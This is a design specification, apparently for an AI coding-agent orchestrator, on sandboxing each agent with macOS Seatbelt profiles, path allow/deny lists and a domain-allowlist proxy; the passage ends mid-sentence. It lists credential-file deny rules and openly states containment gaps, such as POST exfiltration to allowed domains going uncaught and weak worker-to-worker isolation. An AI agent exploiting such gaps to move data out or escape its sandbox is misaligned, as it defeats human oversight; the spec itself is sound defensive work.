# SPEC-SANDBOX.md — Per-Agent Seatbelt Sandboxing

**Status:** IMPLEMENTED — runtime phases merged; phase-4 spec sync and phase-6
dashboard marker are in progress in the current change (2026-07-19)
**Author:** planning session 2026-07-17
**Related:** SPEC.md §2 (Agent Types), §6 (Hooks), §7 (Configuration), §18 (Codex CLI)

## 1. Goal

Give each itsybitsy agent an OS-enforced sandbox, configured per agent type in
its `.md` frontmatter:

- **Filesystem**: which paths outside the worktree the agent may read/write.
- **Network**: which domains the agent may reach.

The reference is [agent-seatbelt-sandbox](https://github.com/michaelneale/agent-seatbelt-sandbox),
which wraps an agent process in macOS Seatbelt (`sandbox-exec`) plus a localhost
HTTP/CONNECT proxy that filters outbound domains. We adopt its two-layer model
but make both layers **per-agent configurable** and **allowlist-first**, which
the reference does not do.

**Honest scope of the isolation (don't oversell — see §4C.5).** Because Seatbelt
is per-path, not per-binary, and a sandboxed agent's `ib`/hooks/watchdog all need
shared write roots (`~/.itsybitsy/agents/**`, its own agent dir), the kernel layer
gives **coarse walls + a real network deny/allowlist + kernel-blocked secrets** —
a large win over today. It does NOT give fine-grained worker-vs-worker filesystem
isolation; that remains the hook layer's (`agent-path.ts`) job. Set expectations
accordingly.

## 2. What the reference project actually provides (and its gaps)

| Reference behavior | What we need instead |
|---|---|
| Single hardcoded `sandbox.sb`, **`(allow default)`** (allow-everything-except) | **Generated per-agent**, **`(deny default)`** (Model B: allow only what's listed) |
| One `-D` param: `SECRETS_DIR` (deny one path) | Per-agent allow lists (the primary knob) + deny lists that carve holes |
| Network = **localhost-only** + Python proxy | Same shape, but proxy enforces a **per-agent allowlist** |
| Domain filtering = **blocklist** (`blocked.txt`), global | **Allowlist** (Adam's ask), per-agent |
| Two manual terminals (`start-proxy.sh`, `start-claude.sh`) | Proxy lifecycle owned by itsybitsy; agents wrapped automatically |
| `sandbox.sb` denies network then allows `localhost:*` out | Reusable — this is the exact shape we want |

Key takeaways:

- The Seatbelt profile is the **filesystem + coarse network** layer (block all
  non-localhost egress at the kernel).
- The **proxy** is the **fine-grained domain** layer (an agent's traffic is
  forced through `http(s)_proxy=localhost:PORT`; the proxy allows/denies by
  domain). The kernel can't filter by domain, so the proxy is required for
  domain-level control. **Caveat carried over from the reference:** the proxy
  sees the CONNECT host, not request bodies — POST exfiltration to an allowed
  domain is not caught. And any tool that ignores `*_proxy` env vars simply
  fails closed (kernel blocks it) rather than escaping.
- **macOS only.** `sandbox-exec` is macOS-specific (and Apple-deprecated but
  functional). On non-macOS, `sandbox.enabled: true` **refuses to spawn** (§5.5
  fail-hard) — it does NOT fall back to an unsandboxed run. (`sandbox.enabled`
  absent/false is unaffected everywhere.) This supersedes the earlier
  "degrade to a no-op" idea, which contradicted Adam's fail-hard call (C1).

## 3. How this fits the existing codebase

### 3.1 There are TWO existing precedents to mirror

1. **`allowedPaths`** (`src/agent-types.ts:52`, `src/hooks/agent-path.ts`,
   `src/ib-commands.ts:4496`): a frontmatter `allowedPaths: string[]` that today
   restricts file access **in userspace** via the `agent-path.ts` PreToolUse
   hook. This is *advisory* — it inspects tool-call paths and allows/denies. The
   seatbelt profile is the *kernel-enforced* companion to this. **Design choice:
   reuse/extend `allowedPaths` as the filesystem source of truth** so we don't
   have two competing path lists (see §4 decision 4).

2. **Codex `workspace-write` sandbox** (`src/codex-spawn.ts:189`,
   `src/ib-commands.ts:4721`): codex agents *already* run in an OS sandbox
   (`codex -a never -s workspace-write` with `extraWritableRoots`). itsybitsy
   already computes the correct writable-root set for a worktree agent:
   `resolveGitRevParsePath(workPath, gitCommonDir)` + parent-repo subdirs
   (`src/ib-commands.ts:4721-4724`). **The seatbelt profile for a Claude agent
   must permit exactly this same root set** (the worktree + its shared `.git`
   common dir), or git operations break. Reuse that computation.

✅ **Implemented:** the shared sandbox wiring is in `src/ib-commands.ts`; both
Codex launch builders in `src/codex-spawn.ts` select `danger-full-access` only
when the resolved, persisted sandbox is enabled and retain `workspace-write`
otherwise.

### 3.2 The `--effort` feature is the threading template

`effort` was threaded frontmatter → parsed `AgentType` → spawn flag, per memory
[[project_effort_level_feature]]. Its **6 verified touch-points** were the exact
map followed (line refs are the planning snapshot):

1. `AgentType` interface field — `src/agent-types.ts:46` (`effort?`); add
   `sandbox?` near :52.
2. Parse + inheritance keys — `SCALAR_KEYS` / `EMPTY_STRING_INHERITS`
   `:415-434`; sandbox needs the **mixed** merge rule (see §4 decision 5), not a plain
   scalar entry.
3. Validation — `:807-811` (effort) / `:813-820` (allowedPaths); add a sandbox
   validator alongside.
4. CLI-flag parse + options — `--effort` at `src/index.ts:1950-1952`;
   `NewAgentOptions` at `ib-commands.ts:3520`.
5. Precedence chain — `ib-commands.ts:4224-4258` (effort, twin of model
   `:4183-4217`) → CLI flag: claude `:4903-4905`; codex
   `mapEffortForCodex` (`agent-cli.ts:124`) → `-c model_reasoning_effort`
   (`codex-config.ts:286-289`).
6. Persist + resume re-derive — `meta` `:4539`, `AgentMeta` `agents.ts:66-73`,
   resume reads from meta `:1317`.

Consume the resolved config when building `start.sh` / `resume.sh` (§3.3).

✅ **Implemented in `src/agent-types.ts`, `src/agents.ts`, and
`src/ib-commands.ts`.** The numbered line references above are the planning
snapshot; the named symbols are authoritative after implementation drift.

### 3.3 The two injection points (exact lines)

Both are where `claude` is exec'd inside a generated bash script. **Each has TWO
branches — a `setsid` branch and a bare/no-setsid fallback — and BOTH must be
wrapped.** ⚠️ **On macOS `setsid` is absent, so the bare fallback branch is the
one that actually fires** — treat `:5044`/`:1600` as the primary target for a
macOS-only feature, not the setsid branch:

- **Spawn**: `src/ib-commands.ts:5042` (setsid) / **`5044` (bare — runs on macOS)** —
  `claude --session-id "${sessionUuid}" ${claudeArgs} "$(cat …)" &`
- **Resume**: `src/ib-commands.ts:1598` (setsid) / **`1600` (bare — runs on macOS)** —
  `claude --resume "${sessionId}" ${claudeArgs} &`
- **Codex** has its own pair in `src/codex-spawn.ts:189/191` (spawn) and
  `375/377` (resume). In v1 codex is wrapped by OUR sandbox too (§4B): its
  `-s workspace-write` is flipped to `-s danger-full-access` and the same
  seatbelt + proxy wrap is applied here — codex is a first-class sandboxed CLI,
  not a maybe-later.

The wrapper transformation at each point:

```bash
# before
setsid claude --session-id "$UUID" $ARGS "$(cat $PROMPT)" &
# after (sandbox enabled) — export proxy vars in start.sh (NO `env` link; see below)
export http_proxy=http://localhost:$PORT https_proxy=http://localhost:$PORT
export HTTP_PROXY=$http_proxy HTTPS_PROXY=$https_proxy
export no_proxy=localhost,127.0.0.1,::1 NO_PROXY=localhost,127.0.0.1,::1
# NO NODE_OPTIONS — the spike confirmed claude honors HTTPS_PROXY natively (dead item, removed).
setsid sandbox-exec -f "$AGENT_DIR/sandbox.sb" \
  -D "WORKTREE=$WORKTREE" -D "GITDIR=$GITDIR" -D "AGENTDIR=$AGENTDIR" \
  claude --session-id "$UUID" $ARGS "$(cat $PROMPT)" &
```

✅ **Spike-confirmed (`docs/SANDBOX-SPIKE-FINDINGS.md`):** `sandbox-exec` execs
in place — `$!` *is* `claude`, PID/watchdog unchanged; the `env`-link drop works
(proxy vars propagate); claude honors `HTTPS_PROXY` natively (no `NODE_OPTIONS`).

**PID / watchdog — exec-in-place confirmed by the spike.**
`sandbox-exec`, like `setsid`, calls `sandbox_init` then **execs** the target
in place (no fork), so after the exec chain `$!` is the single pid that *is*
`claude` — `CLAUDE_PID=$!` (`:5046`/`:1602`), the meta write, `kill`, and
`wait $CLAUDE_PID` all keep working unchanged. And `pgrep -P <panePid> -f
"claude"` (`agent-lifecycle.ts:510`) matches the full cmdline, which still
contains `claude`. The spike confirmed the discovered PID's real command/argv is
the target rather than a lingering wrapper, resolving the original checklist item.
**Simplification applied above:** drop the `env` wrapper link entirely — export
the proxy vars in `start.sh` before the launch line. One fewer process in the
chain and zero ambiguity about what `$!` refers to.

✅ **Implemented:** `prepareSandbox`, `sandboxExecShellPrefix`, and
`sandboxProxyScriptPreamble` in `src/ib-commands.ts` supply this wrap to the
setsid and macOS fallback branches for spawn and resume; `src/codex-spawn.ts`
uses the same preamble/prefix for Codex.

## 4. Shipped frontmatter schema

**Enforcement model: DENY-BY-DEFAULT ALLOWLIST (Model B, confirmed by Adam).**
A sandboxed agent can see/reach **nothing** except what the `.md` file explicitly
allows. The `deny` list carves holes *inside* the allowed set. A wide-open agent
is possible — but only by an **explicit** `allowRead: ["/"]` in the `.md`, never
by default. This is the opposite of the reference project's allow-by-default
`(allow default)` skeleton; §5.1 flips it to `(deny default)`.

⚠️ **Schema uses two FLAT top-level blocks — ONE level of nesting.** The
frontmatter parser supports a parent object with scalar/list children, exactly
as `permissions:` does. Filesystem policy lives under `paths:` with exactly the
three list children `allowRead`, `allowWrite`, and `deny`. Kernel activation,
raw SBPL, and network domains live under `sandbox:` with `enabled`, `rawAllow`,
and `domains`. No deeper `filesystem:` or `network:` objects are supported.

⚠️ **NO trailing inline `#` comments.** The parser strips only FULL-LINE comments
(`agent-types.ts:102`); a trailing `# …` reaches the value unstripped, so
`enabled: true  # note` parses to the truthy STRING `"true  # note"` (and
`enabled: false # note` would ALSO be truthy!), and `deny: [...]  # note` loses
its closing `]` and the whole list silently becomes one garbage string — the
exact footgun §4A.2 warns about. Keep comments on their own lines only:

**Everything the sandbox permits — files, commands, and network — is configured
in the `.md` (Adam, 2026-07-18). NOTHING is baked into code.** The `_all.md`
baseline supplies the floor via union; a type adds what it needs:

```yaml
name: netletworker
paths:
  # FILES — readable paths:
  allowRead:  ["~/.config/foo"]
  # FILES — writable paths (write permission also grants read permission):
  allowWrite: ["/private/tmp/agent-scratch"]
  # FILES — carve holes inside the allowed set; deny always wins:
  deny:       ["**/.env", "~/.ssh"]
sandbox:
  enabled: true
  # COMMANDS / SYSCALLS / NETWORK-BLOCK — raw SBPL, so every non-path hole is
  # visible in the .md too (process exec, mach-lookup, the (deny network*) +
  # localhost proxy holes, etc.). The _all.md baseline carries the required set:
  rawAllow:
    - "(allow process*)"
    - "(allow mach-lookup)"
    - "(deny network*)"
    - "(allow network-outbound (remote ip \"localhost:*\"))"
  # NETWORK — domain allowlist enforced by the per-agent proxy (allowlist only):
  domains:    ["api.anthropic.com", "github.com", "*.githubusercontent.com"]
  # Fully-open file escape hatch stays explicit under paths: allowRead: ["/"]
```

There is no dimension the sandbox controls that isn't a line here: **files** =
`paths.allowRead`/`paths.allowWrite`/`paths.deny`; **commands/exec + syscalls +
the network floor** = `sandbox.rawAllow`; **network egress** =
`sandbox.domains`. The user can read, tighten, or remove any hole.

Both blocks are structurally identical to the existing
`permissions: {allow, deny}` block. `AgentType.paths` is a `PathsConfig`, while
`AgentType.sandbox` is a `SandboxConfig`. An absent `paths:` block remains
`undefined`; a present empty block resolves to three empty lists. Validators
reject non-list path children, unknown keys, malformed path grammar, non-boolean
`sandbox.enabled`, non-list sandbox children, and malformed `rawAllow`.

✅ **Implemented in `src/agent-types.ts` and `src/sandbox.ts`:** both shipped
blocks are flat. The three path lists and the two sandbox lists union and dedupe
within their respective lists across layers, `enabled` OR-merges, and the two
validators enforce their independent schemas.

Design decisions:

1. **`sandbox.enabled` defaults to `false` → the agent runs fully unsandboxed**
   (exactly today's behavior). This is the ONLY unsandboxed path once the feature
   ships. When `true`, the model is deny-by-default: nothing is reachable but the
   baseline (§4A.7) + the explicit allow lists. There is no "sandbox but
   allow-everything" default — openness is opt-in via `paths.allowRead: ["/"]`.
2. **A required baseline allowlist is always present** (§4A.7) so a sandboxed
   agent can actually start. Deny-by-default is unusable without it: Claude Code
   needs `~/.claude`, `/private/tmp`, macOS `/private/var/folders/…` caches, system
   dylibs, the DNS socket, plus the worktree + git-common-dir. **Adam's call
   (draft 1): the static part of this baseline is written explicitly in `_all.md`**
   (inspectable/tunable, rides the existing merge), and **only the runtime-derived
   paths (worktree, git-common-dir) are injected by code** as Seatbelt `-D`
   params. Encoding the static list as an itsybitsy default constant is a later
   optimization. Type `.md`s ADD to the `_all.md` baseline; `deny` still carves
   holes.
3. **Domains ALSO all live in `_all.md` — no code constant (Adam's call).**
   `api.anthropic.com` (+ Claude's required control-plane hosts) must be reachable
   or a sandboxed agent can't reach the model at all — but rather than bake an
   Anthropic host list into code, **list every required domain in `_all.md`'s
   `sandbox.domains`** and build the list out empirically as we experiment
   (same "don't optimize into a constant yet" stance as the filesystem baseline —
   do NOT over-engineer this). Network is allowlist-only (deny-by-default): kernel
   blocks all non-localhost egress, the proxy permits only the merged `domains`
   (`_all.md` baseline ∪ the type's own).
4. **Relationship to the existing `allowedPaths` hook.** `allowedPaths`
   (`agent-path.ts`) remains the legacy advisory hook-layer policy and is not
   changed in this phase. `paths:` is the kernel filesystem policy. There is no
   fallback derivation from `allowedPaths`: an absent `paths:` block resolves to
   empty kernel path lists. Phase B retires `allowedPaths`; until then, authors
   keep the independent policies consistent where both are used.
5. **Inheritance → UNION of all `.md` layers (Adam's call).** Final permissions =
   the sum of every layer: `_all.md` ∪ `_non_coordinator.md` ∪ the explicit
   `inherits` chain ∪ leaf. **Both** the `paths:` lists (`allowRead`,
   `allowWrite`, `deny`) and the `sandbox:` lists (`rawAllow`, `domains`) union
   across the chain — a child can **add** access (union its allow) and/or **narrow** access
   (union its deny). Because deny-wins (§4A.0), a child (or any layer) can never
   re-open what another layer denied. The scalar `enabled` uses **OR-merge** (any
   layer setting `enabled: true` wins), NOT last-non-empty-wins — otherwise a leaf
   type could set `enabled: false` and switch OFF a sandbox that `_all.md` turned
   on, the most total possible "re-open", which contradicts the whole model.
   (Adam authors all type files, so last-wins would be *safe* in practice, but
   OR-merge makes the "a layer can only tighten" invariant hold for `enabled` too.)
   ⚠️ Implementation note: the `permissions` union is a **hand-written special
   case**, not generic machinery — `paths` and `sandbox` each have analogous
   merge code, with exact duplicates removed within each list at merge time.

   ✅ **Implemented in `src/agent-types.ts` (`mergeRawFrontmatters`).** Spawn also
   unions resolved sandbox layers in `src/ib-commands.ts`, preserving the same
   union/OR semantics across `_all.md` and the selected type.

## 4A. Path pattern format for allow/deny lists (AUTHORITATIVE)

This is the exact, user-facing contract for entries in the top-level `paths:`
block's `allowRead` / `allowWrite` / `deny` lists. **We own the grammar and
compile it to Seatbelt's kernel layer.** The original design also called for
mirroring it into the advisory hook layer; the shipped-v1 note in §4A.1 records
that drift.

### 4A.0 The core rule (deny-by-default allowlist)

For any absolute path `P`, a matching `deny` entry denies both operations.
Otherwise the most-specific matching entry across `allowRead`, `allowWrite`,
and the runtime roots decides as specified in §4A.8. Each configured list
includes the always-merged required entries from `_all.md` (§4A.7). In words,
and exactly as Adam stated it:

> **The agent can only see what's in the allow lists, unless that file also
> matches a deny rule.**

- **Not in any allow list → invisible** (kernel `EPERM`). This is the default for
  every path once `enabled: true`.
- **In an allow list or runtime root AND in a deny rule → denied.** `deny` always wins; it carves
  holes *inside* the allowed set. There is no allow rule that can re-open a
  denied path.
- **`allowWrite` implies read and write** (Adam, 2026-09-02). The generator emits
  both `file-read*` and `file-write*` rules for every `allowWrite` entry.
  `allowRead` remains read-only.
- **Exact cross-list ties are write.** If the same canonical compiled path is in
  both `allowRead` and `allowWrite`, normalization removes the read copy and
  emits the write entry once (which still grants both operations). List order
  cannot change that result (Adam, 2026-09-02).
- **Different cross-list globs with the same literal prefix are invalid.** Two
  different glob strings in `allowRead` and `allowWrite` whose text before the
  first `*`, `**`, or `?` is identical are rejected, with both entries and both
  lists named in the error. This prevents order-dependent ambiguous overlap
  until specificity ordering ships separately (Adam, 2026-09-02).
- **Fully-open** is just `allowRead: ["/"]` (and/or `allowWrite: ["/"]`) — an
  explicit `/` subtree allow. Even then, `deny` still carves holes (e.g.
  `allowRead: ["/"]` + `deny: ["**/.env"]` = see everything except `.env` files).

### 4A.1 The two layers a pattern compiles to

The original design called for every pattern to be enforced twice:

| Layer | Engine | What it matches | Where |
|---|---|---|---|
| **Kernel** (real enforcement) | Seatbelt SBPL | absolute paths | `sandbox.sb` — `subpath` / `literal` / `regex` |
| **Hook** (advisory, better errors) | `agent-path.ts` | absolute paths | ordered rule cascade |

Both operate on **fully-resolved absolute paths** (symlinks + `~` + `.`/`..`
normalized). Patterns are never matched against relative paths.

**Shipped-v1 note:** the original two-layer plan above is preserved as design
history, but the shipped sandbox path lists are enforced by the kernel profile.
The existing `allowedPaths` hook remains a separate advisory layer; sandbox
`deny` patterns are not copied into `agent-path.ts`. `resolveSandboxConfig` no
longer derives filesystem rules from `allowedPaths`; `paths:` is the sole source
for configured kernel filesystem rules.

⚠️ **ENTRIES are canonicalized too, not just match targets (G-7).** A `/tmp/x`
entry must compile as `/private/tmp/x`, or it will never match (Seatbelt matches
canonical paths). This must work even for a path that **does not exist yet** (e.g.
a scratch dir the agent will create) — `realpathSync` on a nonexistent path falls
back to the unresolved input, which is the exact gap the existing `allowedPaths`
normalization has (`ib-commands.ts:4511-4516`). The generator must resolve the
longest existing prefix and append the rest, so `/tmp/not-created-yet` still
becomes `/private/tmp/not-created-yet`.

✅ **Implemented in `src/sandbox.ts` (`canonicalizeSandboxPath` and
`canonicalizeGlobPrefix`).**

### 4A.2 The pattern grammar (exactly three anchor forms)

An entry is classified by how it starts. **There is no other form** — anything
else is a spec error the generator rejects at spawn (fail-closed).

**Classification order (precedence — checked in this order):** glob-detection
FIRST, then anchor. `/Users/adam/**/*.pem` satisfies both "starts with `/`" and
"contains a glob char"; it is a **glob** (form 3), because the glob metachars must
be honored. Only if an entry contains NO glob metachar (`*`, `**`, `?`) is it
classified by its anchor (form 1 or 2).

1. **Absolute path** (no glob chars) — starts with `/`
   `/Users/adam/.aws`
   → matches that path **and everything under it** (directory subtree).
   Compiles to Seatbelt `(subpath "/Users/adam/.aws")`.

2. **Home-anchored path** (no glob chars) — starts with `~/`
   `~/.ssh`
   → `~` expands to the agent's `$HOME`, then same subtree semantics as (1).
   **Bare `~` (no trailing slash) is LEGAL** and means `$HOME` (subtree) — the
   existing `allowedPaths` code special-cases `p === "~"` (`ib-commands.ts:4502`);
   match that so the two path systems agree.

3. **Glob pattern** — contains `*`, `**`, or `?` (checked first, see above)
   `**/.env`, `/Users/adam/**/*.pem`, `~/secrets/*`
   → compiled to a Seatbelt `(regex #"…")` via a fixed, documented glob→regex
   translation (§4A.4), **anchored at both ends** (`^…$`) so a glob allow can't
   slip into a near-wildcard. This is the ONLY form that can match by basename
   anywhere on the filesystem.

**Bare names are rejected.** `.env` (no `/`, no glob metachar) is a spec error —
it is neither absolute, home-anchored, nor a glob, so its intent is ambiguous
("relative to what?"). The generator refuses to spawn and tells you to write
`**/.env` (anywhere) or `/abs/path/.env` (one file). This is deliberate: a
silently-misinterpreted deny rule is a security footgun.

### 4A.3 Glob semantics (what the metachars mean)

Standard shell-glob meaning, matched against the absolute path:

| Token | Matches |
|---|---|
| `*` | any run of chars **except `/`** (one path segment) |
| `**` | any run of chars **including `/`** (spans directories, incl. zero) |
| `?` | exactly one char except `/` |
| everything else | literal (`.` is a literal dot, NOT regex "any char") |

So:
- `**/.env` → any path ending in `/.env`, at any depth → **every `.env` on the
  filesystem** (this is the answer to "disallow all `.env` even in the worktree").
- `~/*.pem` → `.pem` files directly in `$HOME`, but not in subdirs.
- `~/**/*.pem` → `.pem` files anywhere under `$HOME`.
- `/etc/ssh` → the whole `/etc/ssh` subtree (absolute form, not a glob).

A glob matches the exact path described by its pattern, not that path's subtree;
for example, `**/foo` matches the `foo` node but not `foo/bar` by path match.

### 4A.4 Worked example — deny ALL `.env`, even inside the worktree

```yaml
paths:
  deny: ["**/.env"]
sandbox:
  enabled: true
```

The original design called for BOTH of the following:

- **Kernel (`sandbox.sb`)** — appended *after* the worktree-allow rules so it
  wins (SBPL = last matching rule decides):
  ```
  (deny file-read*  (regex #"/\.env$"))
  (deny file-write* (regex #"/\.env$"))
  ```
- **Hook (`agent-path.ts`)** — a deny check inserted **before rule 7** (the
  "path within worktree → allow" rule at `agent-path.ts:391`). ⚠️ This ordering
  is the crux: today rule 7 allows anything in the worktree, so a `.env` deny
  placed *after* it would never fire for the project's own `.env`. The
  sandbox-deny list must be evaluated **ahead of** the worktree allow in the
  cascade. (New rule slot, call it rule 6.5.)

**Precedence rule (both layers): `deny` wins over any allow, always.** A path
matched by both an `allowWrite` and a `deny` entry is denied. Document this as
absolute — no "most-specific-match" subtlety.

**Shipped-v1 note:** `generateProfile` implements the kernel half and emits the
filesystem denies last, preserving deny-wins in Seatbelt. The hook-half text is
the original follow-up design and is not a claim about the shipped
`agent-path.ts` cascade.

### 4A.5 The worktree-vs-deny tension (call this out to users)

The worktree is readable/writable because it's in the **baseline allowlist**
(§4A.7) — not because of any allow-by-default. A `deny: ["**/.env"]` **carves a
hole through that baseline inside the worktree too** — the agent will get `EPERM`
reading its own project `.env`. That is exactly what "even in the worktree" means
and is the intended behavior for this rule, but it WILL surprise an agent that
legitimately needs `.env`. The
`session-start` hook (§5.4) should surface active deny patterns in the agent's
prompt so it doesn't burn turns fighting an unfixable `EPERM`.

**Shipped-v1 note:** that session-start guidance was not added; kernel denial
behavior is unchanged and policy changes still require a respawn.

### 4A.6 Regex is an escape hatch, not the interface

Users write **globs**, never raw regex — globs are safer (no catastrophic
backtracking, no accidental unanchored `.`). Internally the generator translates
glob→SBPL-regex. If a power-user case ever needs raw regex, add an explicit
`regex:` prefix later; do **not** expose Seatbelt regex directly in v1.

### 4A.7 The required baseline allowlist — shipped in `_all.md` (Adam's call)

Deny-by-default means an empty allow list = an agent that **can't even start**
(Claude Code can't read its own binary's dylibs, config, or write its transcript).
So a baseline read/write allowlist must always be present.

**Decision (Adam, 2026-07-17, reaffirmed + hardened 2026-07-18): the baseline is
spelled out explicitly in `_all.md`, and the generator bakes in NOTHING.** Not a
"draft 1" convenience — a firm rule: **zero static baseline permissions are
hardcoded in `src/sandbox.ts`.** The generator emits the fixed runtime-root
parameter rules plus exactly what the merged `.md` config declares. Every static
allow — including the `"/"` root entry (currently emitted as `(subpath "/")`)
claude needs to boot, and the OS/dylib read paths — is a line in `_all.md` that the
**user** owns and can inspect, tighten, or remove. Nothing is assumed baked-in and
then discovered broken; the user adds permissions as testing shows they're needed.
`_all.md` already merges into every spawned agent (`agent-types.ts` layer files),
so this needs zero new mechanism — every type unions it in for free. There is no
"encode the baseline as a code constant later" step; that would re-introduce baked-in
permissions and is explicitly rejected. So:

✅ **Implemented in `src/sandbox.ts` (`generateProfile`):** no static baseline
permission or domain is baked into code. The fixed
`AGENTDIR`/`WORKTREE`/`GITDIR`/`REPOAGENTS` rules are the runtime-derived
exception described below; every other filesystem, syscall, and network hole
comes from merged `.md` configuration.

- The static OS/runtime paths go in `_all.md`'s `paths.allowRead`
  / `paths.allowWrite` (and the required domains in `sandbox.domains`). Adam
  edits one file to tune the floor; no code change.
- **Only the truly per-agent, runtime-determined paths are injected by code at
  spawn** — because they don't exist until the worktree is created and can't be
  written in a static `.md`:
  - the agent's **worktree** path,
  - the **git common dir** (`resolveGitRevParsePath` — reuse codex's
    computation, `ib-commands.ts:4721`),
  - the **agent dir** (`<repoPath>/.ittybitty/agents/<id>`, which contains the
    worktree at `/repo`) — **MANDATORY**, not a candidate: hooks write its
    `meta.json`/`agent.log`/`debug-logs/` (§4C.1). Injecting it subsumes
    `WORKTREE`.
  - **`REPOAGENTS`** = `<repoPath>/.ittybitty/agents` (the parent-repo registry) —
    **read**-injected; `ib status` needs it to resolve the agent ("Agent not found"
    without it; `ib list` works without it). New finding, phase-1.5 verification.
  - Claude project data is covered by the static `~/.claude` baseline; the
    shipped profile does not need a separate per-worktree Claude-project param.
  These are passed as Seatbelt `-D` params (`AGENTDIR`, `WORKTREE`, `GITDIR`,
  `REPOAGENTS`, …) by the spawn/resume script, exactly like the reference passes
  `SECRETS_DIR`. ⚠️ **`AGENTDIR` + `GITDIR` must be injected READ+WRITE, not
  write-only** — phase-1.5 proved this is what lets whole-home read collapse to 5
  dotdirs (write-only forces claude to read the worktree's `~/Developer/…` ancestor
  chain, dragging in broad-home read).

**✅ The VERIFIED-minimal `_all.md` block is `docs/SANDBOX-BASELINE-MINIMAL.md §(e)`**
— every rule bisection-minimized against real claude (phase-1.5), paste-ready in the
`allowRead`/`allowWrite`/`deny`/`rawAllow`/`domains` schema. Use it as the starting
`_all.md`; re-verify exact paths on the target install (they're install-layout- and
Claude-version-dependent). The candidate list below is the earlier one-pass draft —
superseded by that doc.

**Shipped baseline sync (2026-07-19):** `docs/agent-types/_all.md` keeps
`enabled: false`. Its domain floor is now `api.anthropic.com`,
`*.anthropic.com`, `platform.claude.com` (required by Claude 2.1.215),
`chatgpt.com`, and `api.openai.com` (Codex). It grants `~/.codex` read+write and
adds `(allow file-ioctl)` for the Codex TUI. These are shipped additions beyond
the earlier Claude-headless minimum; the two findings documents remain the
historical spike record and are intentionally unchanged.

Candidate static `_all.md` contents (SUPERSEDED by `docs/SANDBOX-BASELINE-MINIMAL.md`;
kept for context):

- **Read+write:** `/private/tmp`, `/private/var/folders/**` (macOS per-user
  temp/caches). ⚠️ **`/private/tmp`, NOT `/tmp`** — seatbelt matches CANONICAL
  paths and `/tmp` canonicalizes to `/private/tmp`, so a `subpath` rule on `/tmp`
  never matches (consistent with `/private/etc`, `/private/var/folders`). See the
  entry-canonicalization rule in §4A.1.
- **Read+write (correction — `~/.claude` is NOT read-only):** `~/.claude/**` —
  Claude Code writes transcripts (`projects/`), `history.jsonl`, `statsig/`,
  `todos/`, `shell-snapshots/`, and settings write-backs there. The earlier
  "read-only ~/.claude" classification was an error.
- **Read-only:** `/usr/lib`, `/usr/bin`, **`/usr/local/bin`** (where `ib` is
  installed — was missing), `/System/**`, `/bin`, `/private/etc` (system libs,
  resolv.conf, terminfo), the `claude`/`node` binaries + their `node_modules`.
- **Network:** the required domains (see §4 decision 3 — listed in `_all.md`,
  derived empirically; do not hardcode).

See **§4C** for the paths beyond the OS baseline that the sandbox must allow
because the agent's descendants (`ib`, hooks, watchdog, MCP) run under the same
profile — these were the largest gap the design review surfaced.

Two guarantees:
1. **Spawn resolves, meta.json freezes, resume replays from meta — resume does
   NOT re-read the `.md` files** (fixes C2, matches the model/effort convention).
   At spawn, the FULLY-RESOLVED merged `paths` lists and sandbox config
   (`enabled`, `rawAllow`, `domains`) are written separately to `meta.json`.
   `meta.paths` is written even when sandboxing is disabled. Its entries have
   `~` expanded and their paths/glob prefixes canonicalized, while cross-list
   membership is retained for display of author intent. Both `start.sh` and
   `resume.sh` build the profile from those frozen values + the recomputed
   runtime `-D` params (worktree, gitdir). **The proxy port is the ONE
   deliberately NON-frozen field** — §5.2
   reallocates it on every resume (rewriting meta), so it's stored but not treated
   as immutable like the allow/deny/domain lists (G-5). **Consequence, stated
   explicitly:** editing the `_all.md` floor affects NEW spawns only; a live agent
   keeps its spawn-time sandbox until respawned (consistent with §5.4 "profile is
   fixed at exec").
2. **`deny` still carves into the baseline.** `deny: ["**/.env"]` removes `.env`
   from the `_all.md`-allowed worktree; deny is evaluated last over the full union.

**Merge (§4 decision 5, decided): UNION.** The baseline lives in `_all.md`,
children union their allow lists on top — `_all.md` sets the floor, each type
adds what it needs. `deny` unions too (deny-wins ensures a denied path stays
denied regardless of layer).

✅ **Implemented:** `AgentMeta.paths` and `AgentMeta.sandbox` persist the fully
resolved configuration in `src/agents.ts`; resume uses those frozen blocks,
reallocates only the proxy port, rewrites meta, and regenerates the
profile/scripts in `src/ib-commands.ts`.

### 4A.8 Most specific entry wins

**Decision (Adam, 2026-09-02):** a configured deny wins at every depth.
Otherwise, the most-specific matching entry across the union of `allowRead`,
`allowWrite`, and runtime roots decides. A write entry grants read and write; a
read entry grants read only. No match denies. Entry order, list order, and layer
order never affect the result.

The generator and `resolvePathAccess()` share one ascending total sort key:

1. specificity: segment count of the canonical absolute path; for a glob,
   segment count of its canonical literal prefix (text before the first `*` or
   `?`);
2. kind: plain path before glob;
3. canonical path/pattern string, lexical;
4. operation: read before write.

Exact cross-list canonical ties are normalized to the write entry before this
sort. `AGENTDIR`, `WORKTREE`, and `GITDIR` join the table as write roots;
`REPOAGENTS` joins it as a read root. Their resolved `-D` values determine their
specificity, while the emitted matchers remain `(param "NAME")`. This table is
extensible: later runtime roots such as a scratchpad or project directory add a
row rather than a new emission phase.

For each sorted read entry the profile emits `(allow file-read* M)` followed by
`(deny file-write* M)`. For each sorted write entry it emits the corresponding
read allow followed by `(allow file-write* M)`. Configured denies remain a
separate, deterministic final block and emit both read and write denies. Because
Seatbelt is last-match-wins, more-specific matches appear later and decide.

This ordering fixes the home-read trap. With `allowRead: ["~"]`, a worktree
below `~/Developer` still receives the later, deeper runtime write rule. The
inverse narrowing also works: a type-level read entry for `<worktree>/vendor`
appears after the worktree root and makes that subtree read-only. Likewise,
`allowWrite: ["~/Documents"]` plus
`allowRead: ["~/Documents/Important"]` makes `Important` read-only, while
`allowRead: ["~"]` plus `allowWrite: ["~/Documents"]` makes Documents writable.

**Glob-prefix v1 limitation:** glob specificity uses only literal-prefix segment
depth, not the number or shape of wildcard tokens. Thus `allowRead:
["/a/**/*.pem"]` and `allowWrite: ["/a/b/c"]` make `/a/b/c/x.pem` writable: the
plain root has depth three while the glob prefix has depth one. Different
cross-list globs with the same literal prefix remain a validation error in v1.

The test guarantee has two halves. A small SBPL evaluator substitutes `-D`
values and applies last-match-wins to emitted `subpath`, `literal`, `regex`, and
`param` matchers; every fixture and seeded ordering permutation must match
`resolvePathAccess()` and produce byte-identical profile text. On macOS, a live
probe also compiles the generated profile using the production preflight shape
and executes nested read/write probes with real `sandbox-exec`, proving that the
kernel behavior matches the oracle rather than merely assuming it.

**Resolver boundary.** `resolvePathAccess()` models the `paths` table only —
`allowRead`, `allowWrite`, `deny`, and the runtime roots — and deliberately does
